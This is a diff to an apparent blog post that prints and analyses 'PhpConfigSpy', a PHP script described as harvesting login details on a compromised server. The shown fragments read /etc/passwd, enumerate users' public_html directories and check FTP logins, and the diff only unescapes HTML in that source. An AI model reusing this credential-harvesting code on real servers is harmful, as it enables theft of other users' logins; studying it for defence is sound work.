@@ -17,8 +17,8 @@ This script appears to try to obtain login details for a compromised server.
 ### PhpConfigSpy Source Code
 
 {% highlight php linenos %}<?php 
-echo "&lt;html&gt;"; 
-echo "&lt;title&gt;PhpConfigSpy v0.1&lt;/title&gt;&lt;body&gt;"; 
+echo "<html>"; 
+echo "<title>PhpConfigSpy v0.1</title><body>"; 
 
 set_time_limit(0); 
 
@@ -43,7 +43,7 @@ $i=0;
 
 while(!feof($passwd)) { 
 $str=fgets($passwd); 
-if ($i&gt;35) { 
+if ($i>35) { 
    $pos=strpos($str,":"); 
    $username=substr($str,0,$pos); 
    $dirz="/home/$username/public_html/"; 
@@ -80,8 +80,8 @@ $i++;
 ###
 ###
 #### 
-echo "&lt;br&gt;&lt;br&gt;"; 
-echo "&lt;textarea name='main_window' cols=100 rows=20&gt;"; 
+echo "<br><br>"; 
+echo "<textarea name='main_window' cols=100 rows=20>"; 
 
 echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"; 
 echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories\n"; 
@@ -144,8 +144,8 @@ function ftp_check($login,$pass) {
     } 
 } 
 
-echo "&lt;/textarea&gt;&lt;br&gt;"; 
+echo "</textarea><br>"; 
 
-echo "&lt;/body&gt;&lt;/html&gt;"; 
+echo "</body></html>"; 
 ?>
 {% endhighlight %}
